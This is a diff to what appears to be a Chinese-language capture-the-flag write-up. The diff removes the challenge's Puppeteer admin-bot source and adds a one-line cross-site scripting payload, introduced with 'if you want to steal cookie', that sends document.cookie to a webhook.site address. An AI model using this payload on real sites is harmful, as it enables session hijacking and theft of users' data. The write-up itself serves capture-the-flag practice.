@@ -246,60 +246,14 @@ Payload
 
 ![](https://i.imgur.com/A2tFSHS.png)
 
-Source code
+if you want to steal cookie
+
 ```
-const puppeteer = require("puppeteer")
-const crypto = require("crypto")
-
-const FLAG = process.env.FLAG || 'AIS3{test flag}'
-const ADMIN_USERNAME = process.env.ADMIN_USERNAME || 'admin username'
-const ADMIN_PASSWORD = FLAG
-const SITE = process.env.SITE || 'http://localhost:8000'
-
-console.log(`[+] FLAG: ${FLAG}`)
-console.log(`[+] ADMIN_USERNAME: ${ADMIN_USERNAME}`)
-console.log(`[+] ADMIN_PASSWORD: ${ADMIN_PASSWORD}`)
-console.log(`[+] SITE: ${SITE}`)
-
-const sleep = async s => new Promise(resolve => setTimeout(resolve, 1000 * s))
-
-const visit = async url => {
-	let browser
-	try {
-        url = new URL(url)
-        url.host 
-		browser = await puppeteer.launch({
-			headless: true,
-			args: ["--disable-gpu", "--no-sandbox"],
-            executablePath: "/usr/bin/chromium-browser",
-		});
-		const context = await browser.createIncognitoBrowserContext()
-		const page = await context.newPage()
-
-		await page.goto(SITE)
-		await sleep(1)
-		await page.type("#username", ADMIN_USERNAME+crypto.randomBytes(8).toString('hex'))
-		await page.type("#password", ADMIN_PASSWORD)
-		await page.click("#login");
-		await sleep(1);
-		page.goto(url);
-		await sleep(10);
-
-		await browser.close()
-	} catch (e) {
-		console.log(e)
-	} finally {
-		if (browser) await browser.close()
-	}
-
-}
-
-module.exports = visit
-
-if (require.main === module) {
-	visit(SITE)
-}
+<img src=x onerror=fetch('/api/portfolio').then(r=&gt;{r.text().then(t=&gt;fetch('https://webhook.site/f25d50d9-9c87-4bce-8177-05a3360c5279/?='+btoa(document.cookie),{'mode':'no-cors'}))})>
 ```
+
+
+
 
 ### 插曲 
 有人直接使用admin/admin登入，所以http://url/share?username=admin，就有一堆假FLAG
